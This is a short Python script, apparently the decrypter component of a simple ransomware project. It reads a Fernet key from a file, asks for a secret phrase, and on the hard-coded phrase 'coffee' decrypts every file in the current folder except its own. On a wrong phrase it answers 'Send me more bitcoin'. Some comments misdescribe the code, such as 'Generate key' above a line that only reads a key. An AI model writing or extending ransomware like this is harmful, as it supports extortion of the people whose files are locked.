# Librairies
import os
from cryptography.fernet import Fernet

# Find all files from the machine
files = []

for file in os.listdir():
    if file == "encrypter.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

# Generate key
with open("thekey.key","rb") as key:
    secretKey = key.read()

secretphrase = "coffee"
user_phrase = input("Enter the secret phrase to decrypt your files\n")
if user_phrase == secretphrase:
    for file in files:
        with open(file,"rb") as f:
            data = f.read()
        dataDencrypted = Fernet(secretKey).decrypt(data)
        with open(file,"wb") as f:
            f.write(dataDencrypted)
        print("Congrats, your files are decrypted !")
else :
    print("Sorry, wrong secret phrase. Send me more bitcoin")